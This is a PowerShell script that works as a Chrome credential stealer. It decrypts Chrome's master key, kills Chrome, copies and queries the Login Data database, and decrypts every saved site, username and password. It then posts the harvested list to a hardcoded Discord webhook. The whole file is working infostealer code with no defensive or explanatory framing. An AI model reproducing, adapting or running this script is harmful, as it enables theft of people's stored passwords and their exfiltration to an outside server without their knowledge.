# Debug log
$DebugLog = "C:\Users\black\debug_log.txt"
function Write-DebugLog {
    param ([string]$Message)
    Add-Content -Path $DebugLog -Value "$(Get-Date): $Message"
}

# Function to get Chrome master key
function Get-ChromeMasterKey {
    Write-DebugLog "Checking Local State"
    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (-not (Test-Path $localStatePath)) {
        Write-DebugLog "Local State not found: $localStatePath"
        return $null
    }
    try {
        $localState = Get-Content $localStatePath | ConvertFrom-Json
        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        $encryptedKey = $encryptedKey[5..$encryptedKey.Length]
        Write-DebugLog "Master key retrieved"
        return [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch {
        Write-DebugLog "Master key error: $_"
        return $null
    }
}

# Function to decrypt password
function Decrypt-Password {
    param ([byte[]]$EncryptedValue, [byte[]]$Key)
    try {
        $iv = $EncryptedValue[3..14]
        $payload = $EncryptedValue[15..$EncryptedValue.Length]
        $aes = New-Object System.Security.Cryptography.AesGcm
        $decrypted = New-Object byte[] $payload.Length
        $aes.Decrypt($iv, $payload, $null, $decrypted, $Key)
        Write-DebugLog "Password decrypted"
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        Write-DebugLog "Decryption error: $_"
        return "Decryption Failed"
    }
}

# Main dumper
Write-DebugLog "Starting script"
$masterKey = Get-ChromeMasterKey
if ($masterKey -eq $null) {
    Write-DebugLog "No master key, exiting"
    exit
}

$loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (-not (Test-Path $loginDataPath)) {
    Write-DebugLog "Login Data not found: $loginDataPath"
    exit
}

try {
    Write-DebugLog "Killing Chrome processes"
    Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500

    Write-DebugLog "Copying Login Data"
    $retryCount = 3
    $success = $false
    for ($i = 1; $i -le $retryCount; $i++) {
        try {
            Copy-Item $loginDataPath "$env:TEMP\LoginDataCopy.db" -Force -ErrorAction Stop
            $success = $true
            break
        } catch {
            Write-DebugLog "Copy attempt $i failed: $_"
            Start-Sleep -Milliseconds 1000
        }
    }
    if (-not $success) {
        Write-DebugLog "Failed to copy Login Data after $retryCount attempts"
        exit
    }

    Write-DebugLog "Loading SQLite"
    try {
        Add-Type -Path "C:\Program Files\PackageManagement\NuGet\Packages\System.Data.SQLite.2.0.1\lib\net471\System.Data.SQLite.dll" -ErrorAction Stop
    } catch {
        Write-DebugLog "SQLite load error: $_"
        exit
    }
    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\LoginDataCopy.db")
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    Write-DebugLog "Executing SQL query"
    $reader = $cmd.ExecuteReader()
    $passwords = @()
    while ($reader.Read()) {
        $url = $reader.GetString(0)
        $username = $reader.GetString(1)
        $encryptedPass = $reader.GetValue(2) -as [byte[]]
        if ($encryptedPass.Length -gt 0) {
            if ($encryptedPass[0] -eq 118) {  # AES-GCM
                $password = Decrypt-Password -EncryptedValue $encryptedPass -Key $masterKey
            } else {  # Older DPAPI
                $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encryptedPass, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
            }
            $passwords += "URL: $url | Username: $username | Password: $password"
            Write-DebugLog "Found password for $url"
        }
    }
    $reader.Close()
    $conn.Close()
    Remove-Item "$env:TEMP\LoginDataCopy.db" -Force -ErrorAction SilentlyContinue
    Write-DebugLog "Database cleaned"

    if ($passwords.Count -gt 0) {
        $webhook = "https://discord.com/api/webhooks/1409863952166551633/U3Sot0SdqsTpSK8DzHUgRqU22DzfX4JcPUnnbpdDF6Fnp5a9VSQhxg3YZICmJb06-dM7"
        $body = @{content = ($passwords -join "\n")} | ConvertTo-Json
        Write-DebugLog "Sending to webhook"
        try {
            Invoke-WebRequest -Uri $webhook -Method Post -ContentType "application/json" -Body $body -UseBasicParsing -ErrorAction Stop
            Write-DebugLog "Webhook sent"
        } catch {
            Write-DebugLog "Webhook error: $_"
        }
    } else {
        Write-DebugLog "No passwords found"
    }
} catch {
    Write-DebugLog "Main error: $_"
}
Write-DebugLog "Script ended"